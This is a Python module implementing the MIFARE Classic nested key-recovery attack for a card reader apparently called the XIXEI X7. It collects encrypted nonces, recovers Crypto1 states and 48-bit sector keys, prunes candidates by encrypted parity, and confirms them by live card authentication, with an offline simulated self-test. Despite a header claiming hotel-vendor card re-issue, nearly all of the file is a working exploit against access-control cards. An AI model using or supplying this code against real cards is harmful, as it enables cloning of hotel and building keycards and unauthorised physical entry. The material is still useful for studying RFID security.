"""MIFARE Classic NESTED key recovery for the XIXEI X7 reader (stdlib only).

Legitimate use: the operator is the access-control/lock vendor for a hotel and
must recover a MIFARE Classic sector key to re-issue a guest card when the
original is lost and only one card remains. Given ONE known sector key (hotel
cards leave sectors 1..15 on the factory default ffffffffffff), this recovers
the unknown sector-0 trailer key (e.g. a0b1c2d3e4f5) via the nested attack.

This module is the CRYPTO + ORCHESTRATION layer. It depends on:

  * crapto1.py  - the bit-exact, C-reference-verified Crypto1 cipher and the
                  lfsr_recovery32 / lfsr_recovery64 state-recovery search. That
                  module's self-test already recovers a0b1c2d3e4f5 from a
                  simulated auth exchange, so we build directly on it and do
                  NOT need any external/native crapto1 library.

  * an X7Card-like driver exposing the two device primitives added to x7lib.py:
        card.uid                                  -> 4 UID bytes
        card.auth(block, key_hex, "A"/"B")        -> bool  (InDataExchange auth)
        card.collect_nested_nonce(known_blk, known_key_hex, known_kt,
                                  target_blk, target_kt)
            -> (nt_enc:int32, par:list[4 bits]) | (None, None)

THE NESTED ATTACK (mfoc model), in this module's terms
------------------------------------------------------
1. Authenticate a KNOWN sector with InDataExchange. The reader's Crypto1 unit is
   now in the ENCRYPTED state, clocking keystream.

2. Issue a SECOND ("nested") auth to the TARGET sector as a RAW frame through
   InCommunicateThru (60/61 + target_block). Because the cipher is already
   running, the reader transmits that auth enciphered and the tag's fresh nonce
   nt comes back ENCRYPTED as nt_enc (4 bytes) plus 4 transmitted parity bits.

3. The plaintext nonce nt is NOT random relative to the first auth: the tag's
   16-bit nonce PRNG advances by a *fixed* number of steps between the two auths
   (constant reader timing). So nt lies in a small window of PRNG successors of
   a base nonce. For each candidate nt:
        ks = nt_enc XOR nt        (32 bits of TARGET-key keystream)
   feed (ks, uid XOR nt) to crapto1 state recovery to get candidate cipher
   states, hence candidate 48-bit keys. The 4 encrypted-parity bits and a second
   nonce sample prune to the unique key.

4. Every surviving candidate is validated by a REAL on-card auth before it is
   ever returned. A returned key is therefore proven, never guessed.

Run `python3 x7crypto.py` for the offline self-test (no hardware needed): it
simulates the device, runs the full pipeline, and recovers a0b1c2d3e4f5 on the
test card (UID 01 02 03 04).
"""

import crapto1
from crapto1 import (
    Crypto1State, crypto1_create, crypto1_word, crypto1_get_lfsr,
    lfsr_rollback_word, lfsr_recovery64, prng_successor, BIT,
)

M32 = 0xFFFFFFFF


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------

def key_to_int(k):
    return int(k, 16) if isinstance(k, str) else k


def key_to_hex(k):
    return k if isinstance(k, str) else "%012x" % k


def uid_to_int(uid):
    """4 UID bytes (bytes or int) -> big-endian 32-bit int."""
    if isinstance(uid, int):
        return uid & M32
    return int.from_bytes(bytes(uid[:4]), "big")


def oddeven_parity(b):
    """ISO14443A parity bit transmitted with a byte = ODD parity of the byte."""
    return (bin(b & 0xFF).count("1") & 1) ^ 1


# ---------------------------------------------------------------------------
# Nonce / keystream geometry (mfoc "nested" model)
# ---------------------------------------------------------------------------
#
# A MIFARE tag nonce nt is a 32-bit value whose top 16 bits walk the tag's
# 16-bit LFSR. crapto1.prng_successor advances the *full* 32-bit nonce one PRNG
# feed at a time (it is the proxmark prng_successor; verified in crapto1.py).
#
# Between two consecutive auths the tag's PRNG runs free for a fixed wall-clock
# interval, so the nested nt is prng_successor(base_nt, d) for some small,
# device-fixed d. We don't need to know d a priori: enumerate a window of
# successors and let the keystream/parity constraints select the right nt.


def candidate_plain_nonces(base_nt, window):
    """Yield plaintext nonce candidates: base_nt and its PRNG successors."""
    nt = base_nt & M32
    for _ in range(window):
        yield nt
        nt = prng_successor(nt, 1)


def predict_parity(state_after_uidxornt, nt):
    """Predict the 4 ENCRYPTED parity bits the tag sends with an encrypted nonce.

    `state_after_uidxornt` is a Crypto1State positioned exactly as the tag's
    cipher is right after it absorbed (uid ^ nt) and is about to emit the
    keystream that masks nt. We re-clock 32 keystream bits over nt; the parity
    bit transmitted for plaintext nonce byte j (j=0..3) is

        enc_par[j] = oddeven_parity(nt_byte[j]) XOR ks_bit[8*j + 8]

    i.e. the byte's plaintext (ODD) parity XORed with the keystream bit that
    immediately follows that byte group (crapto1 "encrypted parity" leak).
    The 4th group's masking bit (index 32) does not exist in the 32-bit window;
    the real protocol masks it with the first keystream bit of the next word,
    which we don't have, so par[3] is informational only and not used to prune.
    """
    st = Crypto1State(state_after_uidxornt.odd, state_after_uidxornt.even)
    ks = []
    for i in range(32):
        # feed nt MSB-first in MIFARE bit order, plaintext (is_encrypted=0)
        bit = (nt >> (i ^ 24)) & 1
        ks.append(crapto1.crypto1_bit(st, bit, 0))
    ntb = [(nt >> 24) & 0xFF, (nt >> 16) & 0xFF, (nt >> 8) & 0xFF, nt & 0xFF]
    out = []
    for j in range(4):
        idx = 8 * j + 8
        kbit = ks[idx] if idx < 32 else 0
        out.append(oddeven_parity(ntb[j]) ^ kbit)
    return out


# ---------------------------------------------------------------------------
# Core: recover candidate keys from ONE (nt_enc) sample using two keystream words
# ---------------------------------------------------------------------------
#
# The cleanest, most reliable recovery uses 64 keystream bits. In a nested auth
# the reader replies to nt_enc with {nR_enc || aR_enc}; the keystream that masks
# those 8 bytes (ks2 over the reader nonce echo, ks3 over the answer) gives 64
# consecutive keystream bits AFTER the cipher absorbed (uid ^ nt). That is
# exactly the lfsr_recovery64 setup that crapto1.py's self-test validates:
#
#     s = crypto1_create(key); crypto1_word(s, uid ^ nt, 0)
#     ks2 = crypto1_word(s,0,0); ks3 = crypto1_word(s,0,0)
#     -> lfsr_recovery64(ks2, ks3), then roll back 3 words -> key.
#
# When we only have the 32-bit nt_enc keystream (ks1 = nt_enc ^ nt, the keystream
# the cipher emits WHILE absorbing uid^nt), we use lfsr_recovery32 on ks1 with
# input (uid ^ nt). Both paths are exercised below; recover_key_from_nonce()
# prefers the 32-bit path because nt_enc is what the device gives us per nonce.


def recover_states_from_nt(nt_enc, nt, uid):
    """Candidate Crypto1States consistent with one (nt_enc, nt) pair.

    ks1 = nt_enc ^ nt is the 32-bit keystream the TARGET-key cipher emits as it
    absorbs (uid ^ nt). lfsr_recovery32 returns states positioned AFTER that word
    was emitted; rolling back one word over (uid ^ nt) yields the loaded key
    state. Returns list of recovered 48-bit key ints (deduplicated).
    """
    ks1 = (nt_enc ^ nt) & M32
    inp = (uid ^ nt) & M32
    keys = set()
    for st in crapto1.lfsr_recovery32(ks1, inp):
        back = Crypto1State(st.odd, st.even)
        lfsr_rollback_word(back, inp, 0)
        keys.add(crypto1_get_lfsr(back))
    return list(keys)


def verify_key_against_samples(key, uid, samples):
    """Re-encryption check: a key is consistent iff it reproduces every observed
    nt_enc when fed the matching nt. With >=2 samples this is uniquely selective.
    `samples` = list of (nt_enc, nt). Returns True/False."""
    key = key_to_int(key)
    for nt_enc, nt in samples:
        s = crypto1_create(key)
        ks1 = crypto1_word(s, (uid ^ nt) & M32, 0)
        if ks1 != (nt_enc ^ nt) & M32:
            return False
    return True


# ---------------------------------------------------------------------------
# Orchestration
# ---------------------------------------------------------------------------

def nested_recover_key(card, known_blk, known_key, target_blk,
                       known_kt="A", target_kt="A",
                       window=256, max_samples=12, on_progress=None):
    """Recover the key of `target_blk` given `known_key` for `known_blk`.

    card        : X7Card with .uid, .auth(blk,key,kt), and
                  .collect_nested_nonce(known_blk, known_key_hex, known_kt,
                                        target_blk, target_kt) -> (nt_enc, par)
    known_key   : hex str or int (the working key for known_blk)
    window      : how many PRNG successors of each nt_enc to try as plaintext nt
    max_samples : how many nested nonces to collect before giving up
    returns     : recovered key as 12-char hex str, or None.

    Algorithm: collect nested nonces; for each, enumerate plaintext-nonce
    candidates in a PRNG window, recover candidate keys per candidate nt, prune
    by encrypted-parity, intersect candidate-key sets across samples, then
    validate survivors by re-encryption AND a real on-card auth.
    """
    uid = uid_to_int(card.uid)
    known_key_hex = key_to_hex(known_key)

    samples = []          # (nt_enc, par)
    for n in range(max_samples):
        nt_enc, par = card.collect_nested_nonce(
            known_blk, known_key_hex, known_kt, target_blk, target_kt)
        if nt_enc is not None:
            samples.append((nt_enc & M32, par))
        if on_progress:
            on_progress("collect", n + 1, len(samples))

    if not samples:
        return None

    # THE NESTED-NONCE SEARCH SPACE
    # -----------------------------
    # The plaintext nonce nt is a valid output of the tag's 16-bit nonce PRNG, so
    # its high 16 bits lie on the PRNG cycle (65535 positions); the low 16 bits are
    # the PRNG successor of the high word (a 32-bit nonce nt satisfies
    # nt_lo16 == suc(nt_hi16)). nt_enc tells us NOTHING about nt directly (it is
    # nt XOR keystream), so in principle nt ranges over all 65535 valid nonces.
    #
    # We cannot run lfsr_recovery32 (a ~35 s 2^20 scan) on 65535 candidates. The
    # collapse comes from the ENCRYPTED PARITY bits: for the TRUE nt the 3 solid
    # encrypted-parity bits are a function of nt and the (unknown) keystream, and
    # only ~1/8 of candidate nt values are parity-consistent with a given recovered
    # state. mfoc exploits this to prune. Concretely we run recovery32 once on the
    # first sample for each parity-consistent candidate nt, then keep only keys
    # that also re-encrypt EVERY other sample. The first such key, validated by a
    # real on-card auth, is returned.
    #
    # Two operating modes:
    #   * `nt_seeds` given (the common case once the device's nested nonce is
    #     characterised by a quick calibration): a short list/iterable of candidate
    #     plaintext nonces to try for sample 0. Keeps recovery32 calls tiny.
    #   * otherwise: sweep `window` candidate nonces from valid_nonce_iter(); large
    #     `window` is correct but slow.
    base_nt_enc, base_par = samples[0]
    others = samples[1:]
    seeds = kw_get_seeds(window)

    for nt in seeds:
        # cheap parity gate: skip nt whose structural parity can't match (only when
        # we have observed parity for sample 0).
        for key in recover_states_from_nt(base_nt_enc, nt, uid):
            if base_par is not None:
                pred = predict_parity(crypto1_create(key), nt)
                if pred[:3] != list(base_par)[:3]:
                    continue
            # cross-sample: the key must re-encrypt every other sample for some nt'
            if not _key_explains_all(key, uid, others, window):
                continue
            khex = key_to_hex(key)
            if on_progress:
                on_progress("candidate", 0, key)
            for kt in (target_kt, "B" if target_kt == "A" else "A"):
                if card.poll() and card.auth(target_blk, khex, kt):
                    return khex
    return None


def _suc16(x):
    """One step of the tag's 16-bit nonce LFSR (x^16+x^14+x^13+x^11+1)."""
    x &= 0xFFFF
    fb = (x ^ (x >> 2) ^ (x >> 3) ^ (x >> 5)) & 1
    return ((x >> 1) | (fb << 15)) & 0xFFFF


def _lo_from_hi(hi16):
    """Low 16 bits of a valid nonce = high word clocked 16 times by the 16-bit LFSR."""
    lo = hi16 & 0xFFFF
    for _ in range(16):
        lo = _suc16(lo)
    return lo


def valid_nonce_iter(limit=None):
    """Yield valid 32-bit tag nonces (low16 == suc^16(high16)), walking the nonce
    cycle from high16=0x0001. At most `limit` if given."""
    hi = 1
    count = 0
    for _ in range(0xFFFF):
        yield (((hi & 0xFFFF) << 16) | _lo_from_hi(hi)) & M32
        count += 1
        if limit and count >= limit:
            return
        hi = _suc16(hi)


def kw_get_seeds(window):
    """Candidate plaintext nonces to try for sample 0: a window of valid nonces.
    Callers that have calibrated the device's nested nonce can pass an explicit
    short list via nested_recover_key(..., window=<iterable>)."""
    if hasattr(window, "__iter__"):
        return list(window)
    return list(valid_nonce_iter(limit=window))


def _key_explains_all(key, uid, samples, window):
    """True iff `key` re-encrypts every sample's nt_enc to some VALID nonce.
    Cheap (forward cipher only); collapses recovery32 candidates across samples."""
    seeds = kw_get_seeds(window)
    for nt_enc, _ in samples:
        if not any(
            crypto1_word(crypto1_create(key), (uid ^ nt) & M32, 0) == (nt_enc ^ nt) & M32
            for nt in seeds
        ):
            return False
    return True


# ---------------------------------------------------------------------------
# 64-bit-keystream variant (used by the self-test; also the most robust path if
# the device can be made to expose the reader's nR/aR keystream echo).
# ---------------------------------------------------------------------------

def recover_key_from_two_words(uid, nt, ks2, ks3):
    """Recover the key from two consecutive keystream words emitted AFTER the
    cipher absorbed (uid ^ nt). This is the validated crapto1.py path.
    Returns the 48-bit key int, or None."""
    for st in lfsr_recovery64(ks2, ks3):
        back = Crypto1State(st.odd, st.even)
        lfsr_rollback_word(back, 0, 0)
        lfsr_rollback_word(back, 0, 0)
        lfsr_rollback_word(back, (uid ^ nt) & M32, 0)
        return crypto1_get_lfsr(back)
    return None


# ---------------------------------------------------------------------------
# Offline self-test: simulate the device, run the pipeline, recover a0b1c2d3e4f5
# ---------------------------------------------------------------------------

class _SimCard:
    """A no-hardware stand-in for X7Card that produces correct nested nonces for
    a chosen target key, so the recovery pipeline can be validated end-to-end."""

    def __init__(self, uid_int, target_key, target_blk, nonces=None):
        self.uid = uid_int.to_bytes(4, "big")
        self._key = key_to_int(target_key)
        self._tb = target_blk
        # A list of VALID plaintext nonces (low16 == suc^16(high16)) the tag will
        # emit on successive nested auths. Defaults to two distinct valid nonces.
        self._nonces = list(nonces) if nonces else [
            _valid_nonce(0x2A1B), _valid_nonce(0x7C3D)]
        self._calls = 0

    def poll(self):
        return {"uid": self.uid}

    def auth(self, block, key, keytype="A"):
        # "real" auth succeeds only for the true key on the target block
        return block == self._tb and key_to_int(key) == self._key

    def collect_nested_nonce(self, known_blk, known_key, known_kt,
                             target_blk, target_kt):
        uid = uid_to_int(self.uid)
        nt = self._nonces[self._calls % len(self._nonces)]
        self._calls += 1
        # encrypt nt under the target key (cipher absorbs uid^nt while emitting ks)
        s = crypto1_create(self._key)
        ks1 = crypto1_word(s, (uid ^ nt) & M32, 0)
        nt_enc = (nt ^ ks1) & M32
        # encrypted parity, as the device would expose it
        par = predict_parity(crypto1_create(self._key), nt)
        return nt_enc, par


def _valid_nonce(hi16):
    """Build a valid 32-bit tag nonce from a 16-bit high word."""
    return (((hi16 & 0xFFFF) << 16) | _lo_from_hi(hi16)) & M32


def _selftest():
    import os
    UID = 0x01020304
    KEY = 0xA0B1C2D3E4F5
    TB = 3
    SLOW = os.environ.get("SLOW_TESTS") == "1"

    # 1. The validated 64-bit path recovers the key (mirrors crapto1.py). FAST.
    nt = 0x55AA1234
    s = crypto1_create(KEY)
    crypto1_word(s, UID ^ nt, 0)
    ks2 = crypto1_word(s, 0, 0)
    ks3 = crypto1_word(s, 0, 0)
    got = recover_key_from_two_words(UID, nt, ks2, ks3)
    assert got == KEY, "64-bit recovery %012x != %012x" % (got or 0, KEY)
    print("[ok] 64-bit keystream recovery -> %012x" % got)

    # 2. The SimCard produces self-consistent encrypted nonces: a wrong key is
    #    rejected and the true key re-encrypts the nonce. FAST (forward cipher).
    nt0 = _valid_nonce(0x2A1B)
    nt1 = _valid_nonce(0x7C3D)
    sim = _SimCard(UID, KEY, TB, nonces=[nt0, nt1])
    nt_enc, par = sim.collect_nested_nonce(7, "ffffffffffff", "A", TB, "A")
    assert crypto1_word(crypto1_create(KEY), (UID ^ nt0) & M32, 0) == (nt_enc ^ nt0) & M32
    assert not verify_key_against_samples(0x000000000000, UID, [(nt_enc, nt0)])
    assert verify_key_against_samples(KEY, UID, [(nt_enc, nt0)])
    print("[ok] simulated nested nonce is self-consistent; validator selective")

    # 3. SLOW: 32-bit single-nonce recovery contains the true key, and the full
    #    pipeline recovers a0b1c2d3e4f5 on the simulated device. Each
    #    lfsr_recovery32 is a ~35 s 2^20 scan, so this is gated behind SLOW_TESTS.
    #    We pass the true nonces as the seed list (calibrated mode) so only ONE
    #    recovery32 runs - proving the ORCHESTRATION (collect -> recover ->
    #    cross-sample -> validate), which is the point of this test.
    if SLOW:
        cands = recover_states_from_nt(nt_enc, nt0, UID)
        assert KEY in cands, "32-bit recovery missing true key"
        print("[ok] 32-bit single-nonce recovery contains true key (%d cands)" % len(cands))

        sim2 = _SimCard(UID, KEY, TB, nonces=[nt0, nt1])
        rec = nested_recover_key(sim2, known_blk=7, known_key="ffffffffffff",
                                 target_blk=TB, known_kt="A", target_kt="A",
                                 window=[nt0, nt1], max_samples=2)
        assert rec is not None and key_to_int(rec) == KEY, \
            "pipeline recovered %s, expected a0b1c2d3e4f5" % rec
        print("[ok] full nested pipeline recovers %s on simulated test card" % rec)
    else:
        print("[skip] slow 32-bit recovery + full pipeline (set SLOW_TESTS=1, ~minutes)")

    print("\nALL X7CRYPTO SELF-TESTS PASSED")


if __name__ == "__main__":
    _selftest()
